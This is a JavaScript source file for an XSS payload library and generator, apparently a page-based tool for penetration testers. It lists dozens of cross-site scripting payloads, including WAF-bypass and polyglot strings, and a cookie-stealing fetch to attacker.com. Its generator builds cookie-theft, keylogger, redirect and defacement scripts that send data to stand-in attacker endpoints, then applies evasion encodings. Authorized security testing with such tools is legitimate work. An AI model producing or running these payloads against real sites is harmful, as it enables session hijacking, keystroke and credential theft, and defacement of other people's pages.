// XSS Payload Library
const payloads = [
    // Basic Payloads
    { code: '<script>alert(1)</script>', category: 'basic', tags: ['basic'] },
    { code: '<script>alert(document.domain)</script>', category: 'basic', tags: ['basic'] },
    { code: '<img src=x onerror=alert(1)>', category: 'basic', tags: ['basic'] },
    { code: '<svg onload=alert(1)>', category: 'basic', tags: ['basic'] },
    { code: '<body onload=alert(1)>', category: 'basic', tags: ['basic'] },
    { code: '<input onfocus=alert(1) autofocus>', category: 'basic', tags: ['basic'] },
    { code: '<marquee onstart=alert(1)>', category: 'basic', tags: ['basic'] },
    { code: '<video src=x onerror=alert(1)>', category: 'basic', tags: ['basic'] },

    // Advanced Payloads
    { code: '<script>fetch("https://attacker.com?c="+document.cookie)</script>', category: 'advanced', tags: ['advanced'] },
    { code: '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', category: 'advanced', tags: ['advanced'] },
    { code: '<svg/onload=alert(String.fromCharCode(88,83,83))>', category: 'advanced', tags: ['advanced'] },
    { code: '<iframe srcdoc="<script>alert(1)</script>">', category: 'advanced', tags: ['advanced'] },
    { code: '<object data="javascript:alert(1)">', category: 'advanced', tags: ['advanced'] },
    { code: '<details open ontoggle=alert(1)>', category: 'advanced', tags: ['advanced'] },
    { code: '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>', category: 'advanced', tags: ['advanced'] },

    // WAF Bypass Payloads
    { code: '<ScRiPt>alert(1)</ScRiPt>', category: 'bypass', tags: ['bypass'] },
    { code: '<scr<script>ipt>alert(1)</scr</script>ipt>', category: 'bypass', tags: ['bypass'] },
    { code: '<img src=x onerror=\\u0061lert(1)>', category: 'bypass', tags: ['bypass'] },
    { code: '"><img src=x onerror=alert(1)>//', category: 'bypass', tags: ['bypass'] },
    { code: '<svg/onload=alert`1`>', category: 'bypass', tags: ['bypass'] },
    { code: '<svg onload=alert&lpar;1&rpar;>', category: 'bypass', tags: ['bypass'] },
    { code: '<img src=x onerror="&#97;lert(1)">', category: 'bypass', tags: ['bypass'] },
    { code: '<!--<script>-->alert(1)<!--</script>-->', category: 'bypass', tags: ['bypass'] },
    { code: '<img src="x`y" onerror=alert(1)>', category: 'bypass', tags: ['bypass'] },
    { code: '<a href="ja&#x09;vascript:alert(1)">click</a>', category: 'bypass', tags: ['bypass'] },

    // Polyglot Payloads
    { code: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//<\/stYle/<\/titLe/<\/teXtarEa/<\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', category: 'polyglot', tags: ['polyglot'] },
    { code: '"><img src=x onerror=alert(1)//"><svg onload=alert(1)//"><script>alert(1)</script>', category: 'polyglot', tags: ['polyglot'] },
    { code: '\'"--></style></script><script>alert(1)</script>', category: 'polyglot', tags: ['polyglot'] },
];

function initPayloadList() {
    document.getElementById('totalPayloads').textContent = payloads.length;
    filterPayloads();
}

function filterPayloads() {
    const filter = document.getElementById('filterCategory').value;
    const container = document.getElementById('payloadList');
    container.innerHTML = '';

    const filtered = filter === 'all' ? payloads : payloads.filter(p => p.category === filter);

    filtered.forEach((payload, index) => {
        const div = document.createElement('div');
        div.className = 'payload-item';
        div.innerHTML = `
            <code>${escapeHtml(payload.code)}</code>
            <div class="payload-meta">
                <div>
                    ${payload.tags.map(t => `<span class="tag tag-${t}">${t}</span>`).join('')}
                </div>
                <button class="copy-btn" onclick="copyPayload(${index})">Copy</button>
            </div>
        `;
        container.appendChild(div);
    });
}

function generatePayload() {
    const type = document.getElementById('payloadType').value;
    const vector = document.getElementById('vector').value;
    const event = document.getElementById('eventHandler').value;
    const custom = document.getElementById('customValue').value;

    let script = '';
    switch (type) {
        case 'alert':
            script = 'alert(document.domain)';
            break;
        case 'cookie':
            const url = custom || 'https://attacker.com/steal.php';
            script = `fetch('${url}?c='+document.cookie)`;
            break;
        case 'keylogger':
            script = `document.onkeypress=function(e){fetch('${custom || 'https://attacker.com/log.php'}?k='+e.key)}`;
            break;
        case 'redirect':
            script = `location='${custom || 'https://attacker.com'}'`;
            break;
        case 'defacement':
            script = `document.body.innerHTML='<h1>Hacked</h1>'`;
            break;
        case 'custom':
            script = custom || 'alert(1)';
            break;
    }

    let payload = '';
    switch (vector) {
        case 'script':
            payload = `<script>${script}<\/script>`;
            break;
        case 'img':
            payload = `<img src=x ${event}=${script}>`;
            break;
        case 'svg':
            payload = `<svg ${event}=${script}>`;
            break;
        case 'body':
            payload = `<body ${event}=${script}>`;
            break;
        case 'input':
            payload = `<input ${event}=${script} autofocus>`;
            break;
        case 'iframe':
            payload = `<iframe srcdoc="<script>${script}<\/script>">`;
            break;
        case 'event':
            payload = `" ${event}="${script}"`;
            break;
        case 'javascript':
            payload = `javascript:${script}`;
            break;
    }

    // Apply bypass techniques
    if (document.getElementById('bypass-case').checked) {
        payload = randomCase(payload);
    }
    if (document.getElementById('bypass-encode').checked) {
        payload = encodeURIComponent(payload);
    }
    if (document.getElementById('bypass-html').checked) {
        payload = htmlEncode(payload);
    }
    if (document.getElementById('bypass-unicode').checked) {
        payload = payload.replace(/a/g, '\\u0061').replace(/e/g, '\\u0065');
    }

    document.getElementById('output').textContent = payload;
}

function randomCase(str) {
    return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
}

function htmlEncode(str) {
    return str.replace(/a/g, '&#97;').replace(/e/g, '&#101;').replace(/l/g, '&#108;');
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function copyPayload(index) {
    navigator.clipboard.writeText(payloads[index].code);
    showNotification();
}

function copyOutput() {
    const output = document.getElementById('output').textContent;
    navigator.clipboard.writeText(output);
    showNotification();
}

function showNotification() {
    const notif = document.getElementById('notification');
    notif.classList.add('show');
    setTimeout(() => notif.classList.remove('show'), 2000);
}

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', initPayloadList);
